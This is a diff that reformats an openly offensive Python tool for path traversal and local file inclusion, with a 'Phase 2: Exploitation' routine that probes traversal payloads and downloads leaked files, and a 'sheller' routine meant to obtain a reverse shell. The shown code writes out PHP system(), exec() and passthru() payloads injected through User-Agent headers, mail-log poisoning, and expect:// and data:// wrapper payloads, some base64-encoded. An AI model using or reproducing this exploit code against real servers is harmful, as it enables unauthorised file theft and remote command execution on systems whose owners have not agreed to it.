@@ -187,7 +187,9 @@ def attack_request(
     phase2=False, sheller=False, w=""
 ):
     """
-    This method executes the attack request and returns the result to the caller.
+    This method executes the attack request and returns the
+    result to the caller.
+
     @params:
         # see caller functions
         phase2  - adapt return value to Phase 2
@@ -373,8 +375,12 @@ def phase1(
                 finally:
                     lock.release()
                 if str(r.status_code).startswith("2"):
-                    if (filecheck(r, con2, con3, p) and attack != 4
-                            or filecheck(r, con2, con3, p, post=True) and attack == 4):
+                    if (
+                        filecheck(r, con2, con3, p)
+                        and attack != 4
+                        or filecheck(r, con2, con3, p, post=True)
+                        and attack == 4
+                    ):
                         payloads.append(i)
                         if nb != "":
                             nullbytes.append(nb)
@@ -411,23 +417,23 @@ def phase2(
     """
     [Phase 2]: Exploitation
     @params:
-        attack             - attack mode (-a ACK)
-        url                - target part 1 (-v VIC)
-        url2               - target part 2 (-q VIC2)
+        attack             - attack mode
+        url                - target part 1
+        url2               - target part 2
         keyword            - -p PAM (only for -a 1)
         cookie             - cookiejar for -a 3
         selected           - selected cookie to be poisoned
-        files              - file list created from -l FIL ...
-        dirs               - directory list (permutation level based on -d INT)
-        depth              - attack depth (-d INT)
+        filespath          - file list
+        dirs               - directory list
+        depth              - attack depth
         verbose            - print 404s?
         dl                 - download found files?
         selected_payloads  - payloads selected in phase 1
         selected_nullbytes - terminators selected in phase 1
         selected_prefixes  - PHP wrappers selected in phase 1
-        authcookie         - Authentication Cookie File to bypass Login Screens
-        post_data           - POST Data for --attack 4
-        dirlen             - total directory dictionary size (after permutations)
+        authcookie         - Authentication Cookie File
+        post_data          - POST Data for --attack 4
+        dirlen             - directory dictionary size (after permutations)
         gui                - GUI frame to set the graphical progress bar
     """
     # variables for the progress counter
@@ -478,7 +484,8 @@ def phase2(
                             traverse += i
                             j += 1
 
-                        # send attack requests - with or without nullbyte injection
+                        # send attack requests - with or without
+                        # nullbyte injection
                         requestlist = []
                         for prefix in selected_prefixes:
                             combined = prefix + traverse
@@ -540,55 +547,112 @@ def phase2(
 
                             vfound = False
                             if str(r.status_code).startswith("2"):
-                                if (filecheck(r, con2, con3, p) and attack != 4
-                                        or filecheck(r, con2, con3, p, post=True) and attack == 4):
+                                if (
+                                    filecheck(r, con2, con3, p)
+                                    and attack != 4
+                                    or filecheck(r, con2, con3, p, post=True)
+                                    and attack == 4
+                                ):
                                     vfound = True
                                     if attack == 1 or attack == 2:
-                                        print(color.RD+"[INFO]" + color.O + " leak" + color.END + "       "
-                                              + color.RD + "statvs-code" + color.END + "=" + color.O + str(r.status_code)
-                                              + color.END + " " + color.R + "site" + color.END + "=" + r.url)
+                                        print(
+                                            color.RD+"[INFO]" + color.O
+                                            + " leak" + color.END + "       "
+                                            + color.RD + "statvs-code"
+                                            + color.END + "=" + color.O
+                                            + str(r.status_code)
+                                            + color.END + " " + color.R
+                                            + "site" + color.END + "="
+                                            + r.url
+                                        )
 
                                         if dl and dir + file not in found:
-                                            download(r.url, dir+file, cookie=s.cookies)
+                                            download(
+                                                r.url,
+                                                dir + file,
+                                                cookie=s.cookies,
+                                            )
                                         found.append(dir + file)
                                         if attack == 1:
-                                            urls.append(color.RD + "[pl]" + color.END + color.O + " "
-                                                        + str(r.status_code) + color.END + " "
-                                                        + r.url.split(keyword+"=")[1].replace(url2, ""))
+                                            urls.append(
+                                                color.RD + "[pl]"
+                                                + color.END + color.O + " "
+                                                + str(r.status_code)
+                                                + color.END + " "
+                                                + r.url.split(
+                                                    keyword + "="
+                                                )[1].replace(url2, ""))
                                         else:
                                             vlnlist = r.url.split("/")[1::]
-                                            vlnpath = ("/".join(i for i in vlnlist)).replace(url2, "")
-                                            urls.append(color.RD + "[pl]" + color.END + color.O + " "
-                                                        + str(r.status_code) + color.END + " " + vlnpath)
+                                            vlnpath = (
+                                                "/".join(i for i in vlnlist)
+                                            ).replace(url2, "")
+                                            urls.append(
+                                                color.RD + "[pl]" + color.END
+                                                + color.O + " "
+                                                + str(r.status_code)
+                                                + color.END + " " + vlnpath
+                                            )
                                     elif attack == 3:
                                         s.cookies.set(selected, p)
-                                        print(color.RD + "[INFO]" + color.O + " leak" + color.END +
-                                              "       " + color.RD + "statvs-code" + color.END + "=" + color.O
-                                              + str(r.status_code) + color.END + " " + color.R + "cookie" +
-                                              color.END + "=" + p)
+                                        print(
+                                            color.RD + "[INFO]" + color.O
+                                            + " leak" + color.END + "       "
+                                            + color.RD + "statvs-code"
+                                            + color.END + "=" + color.O
+                                            + str(r.status_code) + color.END
+                                            + " " + color.R + "cookie" +
+                                            color.END + "=" + p
+                                        )
 
                                         if dl and dir + file not in found:
-                                            download(r.url, dir+file, cookie=s.cookies)
+                                            download(
+                                                r.url,
+                                                dir + file,
+                                                cookie=s.cookies,
+                                            )
                                         found.append(dir + file)
-                                        urls.append(color.RD + "[pl]" + color.END + color.O + " " +
-                                                    str(r.status_code) + color.END + " " + p)
+                                        urls.append(
+                                            color.RD + "[pl]" + color.END
+                                            + color.O + " "
+                                            + str(r.status_code)
+                                            + color.END + " " + p
+                                        )
                                     elif attack == 4:
-                                        print(color.RD + "[INFO]" + color.O + " leak" + color.END +
-                                              "       " + color.RD + "statvs-code" + color.END + "=" + color.O
-                                              + str(r.status_code) + color.END + " " + color.R + "post_data"
-                                              + color.END + "=" + p)
+                                        print(
+                                            color.RD + "[INFO]" + color.O
+                                            + " leak" + color.END + "       "
+                                            + color.RD + "statvs-code"
+                                            + color.END + "=" + color.O
+                                            + str(r.status_code) + color.END
+                                            + " " + color.R + "post_data"
+                                            + color.END + "=" + p
+                                        )
 
                                         if dl and dir + file not in found:
-                                            download(r.url, dir + file, cookie=s.cookies, post=data)
+                                            download(
+                                                r.url,
+                                                dir + file,
+                                                cookie=s.cookies,
+                                                post=data,
+                                            )
                                         found.append(dir + file)
-                                        urls.append(color.RD + "[pl]" + color.END + color.O + " "
-                                                    + str(r.status_code) + color.END + " " + p)
+                                        urls.append(
+                                            color.RD + "[pl]" + color.END
+                                            + color.O + " "
+                                            + str(r.status_code)
+                                            + color.END + " " + p
+                                        )
 
                             if verbose and not vfound:
                                 if attack == 1 or attack == 2:
-                                    print(color.END + "{}|: ".format(r.status_code)+r.url)
+                                    print(color.END + "{}|: ".format(
+                                        r.status_code) + r.url,
+                                    )
                                 elif attack == 3 or attack == 4:
-                                    print(color.END + "{}|: ".format(r.status_code)+r.url + " : " + p)
+                                    print(color.END + "{}|: ".format(
+                                        r.status_code) + r.url + " : " + p
+                                    )
                     d += 1
         return (found, urls)
     except KeyboardInterrupt:
@@ -601,7 +665,9 @@ def sheller(
     authcookie, post_data, depth, gui, app
 ):
     """
-    second exploitation module: try to gain a reverse shell over the system
+    second exploitation module: try to gain a
+    reverse shell over the system
+
     @params:
         technique - technique index (see variables.rce)
     """
@@ -646,7 +712,9 @@ def sheller(
         for cookie in tmpjar:
             s.cookies.set_cookie(cookie)
 
-    con2, con3 = initial_ping(s, attack, url, url2, keyword, timeout)
+    con2, con3 = initial_ping(
+        s, attack, url, url2, keyword, timeout,
+    )
 
     if technique != 6:
         sys.stdout.write("{0} └── Looking for Log File:{1}".format(
@@ -699,9 +767,12 @@ def sheller(
                     if attack == 3:
                         s.cookies.set(selected, p)
                     if str(r.status_code).startswith("2"):
-                        if (filecheck(r, con2, con3, p) and attack != 4
-                                or filecheck(r, con2, con3, p, post=True)
-                                and attack == 4):
+                        if (
+                            filecheck(r, con2, con3, p)
+                            and attack != 4
+                            or filecheck(r, con2, con3, p, post=True)
+                            and attack == 4
+                        ):
                             success = (r, p, nb, data, traverse)
                             found = True
                             break
@@ -752,7 +823,9 @@ def sheller(
                 prep.headers["content-length"] = len(new_body)
 
         if technique == 1:
-            prep.headers["User-agent"] = '<?php system("{}"); ?>'.format(PAYLOAD)
+            prep.headers[
+                "User-agent"
+            ] = '<?php system("{}"); ?>'.format(PAYLOAD)
             sys.stdout.write("{0}  : Trying system():{1}      ".format(
                 color.RD, color.END
             ))
@@ -774,7 +847,9 @@ def sheller(
                 show_status(gui, timeout=True)
                 if app:
                     app.processEvents()
-            prep.headers["User-agent"] = '<?php exec("{}"); ?>'.format(PAYLOAD)
+            prep.headers[
+                "User-agent"
+            ] = '<?php exec("{}"); ?>'.format(PAYLOAD)
             sys.stdout.write("{0}  : Trying exec():{1}        ".format(
                 color.RD, color.END,
             ))
@@ -796,7 +871,9 @@ def sheller(
                 show_status(gui, timeout=True)
                 if app:
                     app.processEvents()
-            prep.headers["User-agent"] = '<?php passthru("{}"); ?>'.format(PAYLOAD)
+            prep.headers[
+                "User-agent"
+            ] = '<?php passthru("{}"); ?>'.format(PAYLOAD)
             sys.stdout.write("{0}  : Trying passthru():{1}    ".format(
                 color.RD, color.END
             ))
@@ -973,7 +1050,11 @@ def sheller(
                         stdout=subprocess.PIPE,
                     )
                     subprocess.call(
-                        ["mail", "-s", topics[i], "www-data@{}".format(host)],
+                        [
+                            "mail",
+                            "-s", topics[i],
+                            "www-data@{}".format(host)
+                        ],
                         stdin=p.stdout,
                     )
                 except Exception as e:
@@ -995,12 +1076,21 @@ def sheller(
         elif technique == 6:
             wrappersPart1 = [
                 'expect://{}'.format(PAYLOAD),
-                'data://text/plain,<?php system("{}"); ?>'.format(PAYLOAD),
-                'data://text/plain,<?php exec("{}"); ?>'.format(PAYLOAD),
-                'data://text/plain,<?php passthru("{}"); ?>'.format(PAYLOAD),
-                'data://text/plain;base64,' + encode64('<?php system("{}"); ?>'.format(PAYLOAD)),
-                'data://text/plain;base64,' + encode64('<?php exec("{}"); ?>'.format(PAYLOAD)),
-                'data://text/plain;base64,' + encode64('<?php passthru("{}"); ?>'.format(PAYLOAD))
+                'data://text/plain,<?php system'
+                '("{}"); ?>'.format(PAYLOAD),
+                'data://text/plain,<?php exec'
+                '("{}"); ?>'.format(PAYLOAD),
+                'data://text/plain,<?php passthru'
+                '("{}"); ?>'.format(PAYLOAD),
+                'data://text/plain;base64,' + encode64(
+                    '<?php system("{}"); ?>'.format(PAYLOAD)
+                ),
+                'data://text/plain;base64,' + encode64(
+                    '<?php exec("{}"); ?>'.format(PAYLOAD)
+                ),
+                'data://text/plain;base64,' + encode64(
+                    '<?php passthru("{}"); ?>'.format(PAYLOAD)
+                )
             ]
 
             namesPart1 = [
@@ -1025,7 +1115,9 @@ def sheller(
                     gui.show()
                     app.processEvents()
                 if attack == 1:
-                    prep = query("", "", wrapper, "", keyword, url, url2, s)[0]
+                    prep = query(
+                        "", "", wrapper, "", keyword, url, url2, s
+                    )[0]
                 elif attack == 2:
                     prep = inpath("", "", wrapper, "", url, url2, s)[0]
                 elif attack == 3:
@@ -1033,7 +1125,11 @@ def sheller(
                     req = requests.Request(method="GET", url=url)
                     prep = s.prepare_request(req)
                 elif attack == 4:
-                    req = requests.Request(method="POST", url=url, data=wrapper)
+                    req = requests.Request(
+                        method="POST",
+                        url=url,
+                        data=wrapper,
+                    )
                     prep = s.prepare_request(req)
                     new_body = unquote(prep.body)
                     prep.body = new_body
